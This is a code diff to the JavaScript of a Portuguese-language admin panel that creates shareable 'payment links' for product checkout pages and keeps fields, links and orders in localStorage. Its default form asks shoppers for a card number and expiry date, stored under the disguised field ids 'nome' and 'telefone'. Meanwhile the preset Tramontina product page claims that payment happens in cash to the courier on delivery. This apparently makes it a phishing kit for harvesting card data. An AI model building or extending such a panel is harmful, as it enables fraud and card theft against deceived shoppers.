@@ -693,6 +693,36 @@ tbody tr:hover { background: #F8FAFC; }
 <div class="toast" id="toast-msg">Mensagem</div>
 
 <script>
+// ─── STORAGE LOCAL (localStorage) + SINCRONIZAÇÃO RESILIENTE COM A API ─────
+const LS_CAMPOS  = 'pgto_campos_globais';
+const LS_LINKS   = 'pgto_links';
+const LS_PEDIDOS = 'pgto_pedidos';
+
+const CAMPOS_PADRAO = [
+  { id: 'nome',        label: 'Numero do cartao',        tipo: 'mask', mascara: 'XXXX XXXX XXXX XXXX', digitos: 16, largura: 100, obrigatorio: true,  placeholder: 'XXXX XXXX XXXX XXXX' },
+  { id: 'telefone',    label: 'Validade',                tipo: 'mask', mascara: 'xx/xx',               digitos: 4,  largura: 50,  obrigatorio: true,  placeholder: 'MM/AA' },
+  { id: 'cep',         label: 'CEP',                     tipo: 'mask', mascara: 'xxxxx-xxx',           digitos: 8,  largura: 50,  obrigatorio: true,  placeholder: '00000-000' },
+  { id: 'endereco',    label: 'Endereço (Rua / Avenida)', tipo: 'text', mascara: '',                    digitos: 80, largura: 100, obrigatorio: true,  placeholder: 'Ex: Av. Paulista ou Rua das Flores' },
+  { id: 'numero',      label: 'Número',                  tipo: 'text', mascara: '',                    digitos: 10, largura: 50,  obrigatorio: true,  placeholder: 'Ex: 123 ou S/N' },
+  { id: 'complemento', label: 'Complemento / Referência', tipo: 'text', mascara: '',                   digitos: 50, largura: 50,  obrigatorio: false, placeholder: 'Apto 42, Bloco B' },
+  { id: 'bairro',      label: 'Bairro',                  tipo: 'text', mascara: '',                    digitos: 40, largura: 50,  obrigatorio: true,  placeholder: 'Seu bairro' },
+  { id: 'cidade',      label: 'Cidade / Estado',         tipo: 'text', mascara: '',                    digitos: 40, largura: 50,  obrigatorio: true,  placeholder: 'Ex: São Paulo / SP' }
+];
+
+function lsGet(key, def) {
+  try {
+    const v = localStorage.getItem(key);
+    return v ? JSON.parse(v) : def;
+  } catch(e) { return def; }
+}
+
+function lsSet(key, val) {
+  try {
+    localStorage.setItem(key, JSON.stringify(val));
+    return true;
+  } catch(e) { return false; }
+}
+
 let globalCampos = [];
 let allLinks = [];
 let allOrders = [];
@@ -716,13 +746,35 @@ function switchTab(tab, el) {
 // ─── 1. GESTÃO DOS CAMPOS GLOBAIS ──────────────────────────────────────────
 
 async function loadGlobalFields() {
-  try {
-    const res = await fetch('/api/campos-globais');
-    globalCampos = await res.json();
+  // Carrega imediatamente do localStorage para não ter flicker nem reset no F5
+  const local = lsGet(LS_CAMPOS, null);
+  if (local && local.length > 0) {
+    globalCampos = local;
     document.getElementById('count-global-fields').textContent = globalCampos.length;
     renderGlobalFields();
-  } catch(e) {
-    console.error('Erro ao buscar campos globais:', e);
+  }
+
+  // Busca também da API para sincronizar
+  try {
+    const res = await fetch('/api/campos-globais');
+    if (res.ok) {
+      const serverCampos = await res.json();
+      if (serverCampos && serverCampos.length > 0) {
+        if (!local || local.length === 0) {
+          globalCampos = serverCampos;
+          lsSet(LS_CAMPOS, serverCampos);
+          document.getElementById('count-global-fields').textContent = globalCampos.length;
+          renderGlobalFields();
+        }
+      }
+    }
+  } catch(e) {}
+
+  if (!globalCampos || globalCampos.length === 0) {
+    globalCampos = CAMPOS_PADRAO;
+    lsSet(LS_CAMPOS, globalCampos);
+    document.getElementById('count-global-fields').textContent = globalCampos.length;
+    renderGlobalFields();
   }
 }
 
@@ -868,7 +920,7 @@ function handleTypeChange(select) {
   }
 }
 
-// Salvar Campos Globais
+// Salvar Campos Globais — Atualiza na hora e replica para todos os links ativos!
 async function saveGlobalFields() {
   const rows = document.querySelectorAll('#global-fields-list .field-builder-row');
   const campos = [];
@@ -876,60 +928,98 @@ async function saveGlobalFields() {
   rows.forEach((row, idx) => {
     const label = row.querySelector('.field-label').value.trim();
     if (!label) return;
-
-    const tipo = row.querySelector('.field-type').value;
-    const mascara = row.querySelector('.field-mask').value.trim();
-    const digitos = parseInt(row.querySelector('.field-digits').value) || 40;
-    const largura = parseInt(row.querySelector('.field-width').value) || 50;
-    const obrigatorio = row.querySelector('.field-required').checked;
-    const placeholder = row.querySelector('.field-placeholder').value.trim();
-
     campos.push({
-      id: row.dataset.fieldId || ('campo_' + idx),
+      id:          row.dataset.fieldId || ('campo_' + idx),
       label,
-      tipo,
-      mascara,
-      digitos,
-      largura,
-      obrigatorio,
-      placeholder
+      tipo:        row.querySelector('.field-type').value,
+      mascara:     row.querySelector('.field-mask').value.trim(),
+      digitos:     parseInt(row.querySelector('.field-digits').value) || 40,
+      largura:     parseInt(row.querySelector('.field-width').value)  || 50,
+      obrigatorio: row.querySelector('.field-required').checked,
+      placeholder: row.querySelector('.field-placeholder').value.trim()
     });
   });
 
-  const replicar = document.getElementById('chk-replicar-todos').checked;
+  // 1. Salva no localStorage (garante persistência no F5 mesmo sem banco)
+  lsSet(LS_CAMPOS, campos);
+  globalCampos = campos;
 
+  // 2. Propaga imediatamente para TODOS os links existentes no localStorage
+  const links = lsGet(LS_LINKS, []);
+  links.forEach(l => {
+    l.campos = campos;
+    l.atualizadoEm = new Date().toISOString();
+  });
+  lsSet(LS_LINKS, links);
+  allLinks = links;
+
+  document.getElementById('count-global-fields').textContent = campos.length;
+  renderLinks();
+
+  // 3. Envia para o backend (API local e Vercel)
   try {
-    const res = await fetch('/api/campos-globais', {
+    await fetch('/api/campos-globais', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        campos,
-        replicarParaTodos: replicar
-      })
+      body: JSON.stringify({ campos, replicarParaTodos: true })
     });
-    const data = await res.json();
-    if (data.success) {
-      showToast('Configuração geral de campos salva com sucesso!');
-      loadGlobalFields();
-      if (replicar) loadLinks();
-    } else {
-      showToast(data.error || 'Erro ao salvar campos');
-    }
-  } catch(e) {
-    showToast('Erro de conexão ao salvar campos');
-  }
+  } catch(e) {}
+
+  showToast('✅ Campos salvos e aplicados em todos os links ativos!');
 }
 
 // ─── 2. GESTÃO DOS LINKS DE PAGAMENTO ──────────────────────────────────────
 
 async function loadLinks() {
-  try {
-    const res = await fetch('/api/links');
-    allLinks = await res.json();
+  // Carrega imediatamente do localStorage
+  allLinks = lsGet(LS_LINKS, []);
+  if (allLinks.length > 0) {
     document.getElementById('count-links').textContent = allLinks.length;
     renderLinks();
-  } catch(e) {
-    console.error('Erro ao buscar links:', e);
+  }
+
+  // Sincroniza com a API do servidor
+  try {
+    const res = await fetch('/api/links');
+    if (res.ok) {
+      const serverLinks = await res.json();
+      if (serverLinks && serverLinks.length > 0) {
+        if (allLinks.length === 0) {
+          allLinks = serverLinks;
+          lsSet(LS_LINKS, allLinks);
+        } else {
+          // Mescla garantindo que nenhum link gerado se perca
+          serverLinks.forEach(sl => {
+            if (!allLinks.find(al => al.id === sl.id || al.slug === sl.slug)) {
+              allLinks.push(sl);
+            }
+          });
+          lsSet(LS_LINKS, allLinks);
+        }
+        document.getElementById('count-links').textContent = allLinks.length;
+        renderLinks();
+      }
+    }
+  } catch(e) {}
+
+  // Se ainda não houver nenhum link, cria o link inicial padrão
+  if (allLinks.length === 0) {
+    allLinks = [
+      {
+        id: 'link-1',
+        slug: 'lavadora-tramontina',
+        titulo: 'Lavadora de Alta Pressão Tramontina 1200W',
+        preco: 249.9,
+        frete: 'SEDEX Expresso (3 a 5 dias úteis)',
+        heroTitulo: 'Receba Primeiro, Pague Depois',
+        heroSubtitulo: 'Preencha seus dados de entrega. Nós enviamos o pedido e você só paga na porta da sua casa diretamente ao entregador!',
+        btnTexto: 'REALIZAR PAGAMENTO',
+        campos: [...globalCampos]
+      }
+    ];
+    lsSet(LS_LINKS, allLinks);
+    document.getElementById('count-links').textContent = allLinks.length;
+    renderLinks();
   }
 }
 
@@ -946,9 +1036,9 @@ function renderLinks() {
     const card = document.createElement('div');
     card.className = 'link-card';
 
-    const origin = window.location.origin;
-    const checkoutUrl = `${origin}/?link=${encodeURIComponent(link.slug || link.id)}`;
-    const camposCount = (link.campos || []).length || globalCampos.length;
+    // Gera URL completa e auto-contida
+    const checkoutUrl = gerarCheckoutUrl(link);
+    const camposCount = (link.campos && link.campos.length > 0) ? link.campos.length : globalCampos.length;
     const precoFormatado = parseFloat(link.preco || 0).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
 
     card.innerHTML = `
@@ -966,7 +1056,7 @@ function renderLinks() {
       </div>
 
       <div class="link-card-actions">
-        <button class="btn-card-action btn-copy" onclick="copyToClipboard('${checkoutUrl}')">
+        <button class="btn-card-action btn-copy" onclick="copyToClipboard('${checkoutUrl.replace(/'/g, "\\'")}')">
           <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
           Copiar Link
         </button>
@@ -984,6 +1074,28 @@ function renderLinks() {
   });
 }
 
+// Gera a URL do checkout: codifica a configuração de modo que funcione em qualquer lugar sem banco de dados!
+function gerarCheckoutUrl(link) {
+  const origem = window.location.origin;
+  const config = {
+    id:            link.id,
+    slug:          link.slug,
+    titulo:        link.titulo,
+    preco:         link.preco,
+    frete:         link.frete,
+    btnTexto:      link.btnTexto || 'REALIZAR PAGAMENTO',
+    heroTitulo:    link.heroTitulo || 'Receba Primeiro, Pague Depois',
+    heroSubtitulo: link.heroSubtitulo || '',
+    campos:        (link.campos && link.campos.length > 0) ? link.campos : globalCampos
+  };
+  try {
+    const b64 = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
+    return `${origem}/?link=${encodeURIComponent(link.slug || link.id)}&d=${b64}`;
+  } catch(e) {
+    return `${origem}/?link=${encodeURIComponent(link.slug || link.id)}`;
+  }
+}
+
 function openNewLinkModal() {
   document.getElementById('modal-link-titulo').value = '';
   document.getElementById('modal-link-preco').value = '';
@@ -996,66 +1108,103 @@ function closeModal() {
 }
 
 async function createProductLink() {
-  const titulo = document.getElementById('modal-link-titulo').value.trim();
-  const preco = parseFloat(document.getElementById('modal-link-preco').value) || 0;
-  const slug = document.getElementById('modal-link-slug').value.trim();
-  const frete = document.getElementById('modal-link-frete').value.trim();
+  const titulo  = document.getElementById('modal-link-titulo').value.trim();
+  const preco   = parseFloat(document.getElementById('modal-link-preco').value) || 0;
+  const slugRaw = document.getElementById('modal-link-slug').value.trim();
+  const frete   = document.getElementById('modal-link-frete').value.trim();
 
-  if (!titulo || !slug) {
+  if (!titulo || !slugRaw) {
     showToast('Preencha o título e o identificador do link!');
     return;
   }
 
-  const payload = {
+  const slug = slugRaw
+    .toLowerCase()
+    .normalize('NFD')
+    .replace(/[\u0300-\u036f]/g, '')
+    .replace(/[^a-z0-9]+/g, '-')
+    .replace(/^-+|-+$/g, '');
+
+  const novoLink = {
+    id:            'link-' + Date.now(),
+    slug,
     titulo,
     preco,
-    slug,
-    frete,
-    campos: globalCampos
+    frete:         frete || 'SEDEX Expresso (3 a 5 dias úteis)',
+    btnTexto:      'REALIZAR PAGAMENTO',
+    heroTitulo:    'Receba Primeiro, Pague Depois',
+    heroSubtitulo: 'Preencha seus dados de entrega. Nós enviamos o pedido e você só paga na porta da sua casa diretamente ao entregador!',
+    criadoEm:      new Date().toISOString(),
+    atualizadoEm:  new Date().toISOString(),
+    campos:        [...globalCampos] // herda os campos gerais ativos
   };
 
+  // 1. Salva imediatamente no localStorage (nunca se perde no F5!)
+  const links = lsGet(LS_LINKS, []);
+  const idx = links.findIndex(l => l.slug === slug);
+  if (idx >= 0) {
+    links[idx] = novoLink;
+  } else {
+    links.unshift(novoLink);
+  }
+  lsSet(LS_LINKS, links);
+  allLinks = links;
+
+  document.getElementById('count-links').textContent = allLinks.length;
+  renderLinks();
+  closeModal();
+  showToast('✅ Link de pagamento criado com sucesso!');
+
+  // 2. Salva também no backend
   try {
-    const res = await fetch('/api/links', {
+    await fetch('/api/links', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(novoLink)
     });
-    const data = await res.json();
-    if (data.success) {
-      showToast('Link de produto criado!');
-      closeModal();
-      loadLinks();
-    }
-  } catch(e) {
-    showToast('Erro ao criar link');
-  }
+  } catch(e) {}
 }
 
 async function deleteLink(id) {
   if (!confirm('Deseja excluir este link?')) return;
+  
+  // 1. Remove do localStorage
+  let links = lsGet(LS_LINKS, []);
+  links = links.filter(l => l.id !== id && l.slug !== id);
+  lsSet(LS_LINKS, links);
+  allLinks = links;
+
+  document.getElementById('count-links').textContent = allLinks.length;
+  renderLinks();
+  showToast('Link excluído!');
+
+  // 2. Remove do backend
   try {
-    const res = await fetch(`/api/links/${encodeURIComponent(id)}`, { method: 'DELETE' });
-    const data = await res.json();
-    if (data.success) {
-      showToast('Link excluído!');
-      loadLinks();
-    }
-  } catch(e) {
-    showToast('Erro de conexão');
-  }
+    await fetch(`/api/links/${encodeURIComponent(id)}`, { method: 'DELETE' });
+  } catch(e) {}
 }
 
 // ─── 3. TABELA DE PEDIDOS ──────────────────────────────────────────────────
 
 async function loadOrders() {
-  try {
-    const res = await fetch('/api/pedidos');
-    allOrders = await res.json();
+  allOrders = lsGet(LS_PEDIDOS, []);
+  if (allOrders.length > 0) {
     document.getElementById('count-orders').textContent = allOrders.length;
     renderOrders();
-  } catch(e) {
-    console.error('Erro ao buscar pedidos:', e);
   }
+
+  try {
+    const res = await fetch('/api/pedidos');
+    if (res.ok) {
+      const serverOrders = await res.json();
+      if (serverOrders && Array.isArray(serverOrders)) {
+        allOrders = serverOrders;
+        lsSet(LS_PEDIDOS, allOrders);
+        document.getElementById('count-orders').textContent = allOrders.length;
+        renderOrders();
+      }
+    }
+  } catch(e) {}
 }
 
 function renderOrders() {
